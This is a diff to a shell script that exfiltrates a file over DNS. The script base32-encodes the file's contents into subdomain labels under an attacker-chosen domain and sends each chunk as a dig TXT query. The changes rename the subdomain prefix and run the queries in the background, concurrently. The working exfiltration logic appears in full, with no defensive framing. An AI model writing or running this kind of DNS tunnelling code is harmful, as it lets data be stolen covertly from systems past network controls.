@@ -32,7 +32,7 @@ fi
 # Generate a random string to make sure the domains wont be cached 
 # Also acts as filename to do multiple concurrent file uploads to one server
 filesuffix=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1) 
-domain=$(echo "fu." "$2" | sed 's/ //g') 
+domain=$(echo "ex." "$2" | sed 's/ //g') 
 index=0
 output=$(cat $1 | base32 -w 63 | tr '[:upper:]' '[:lower:]' | sed "s/\$/.NUM.$filesuffix.$domain/")
 linestot=$(echo "$output" | wc -l) 
@@ -51,5 +51,5 @@ while read -r line ; do
 	fi 
 	echo "$line"
 	#dig $line @localhost TXT &> /dev/null & 
-	dig +short $line TXT  
+	dig +short $line TXT  & 
 done <<< $(echo "$output")
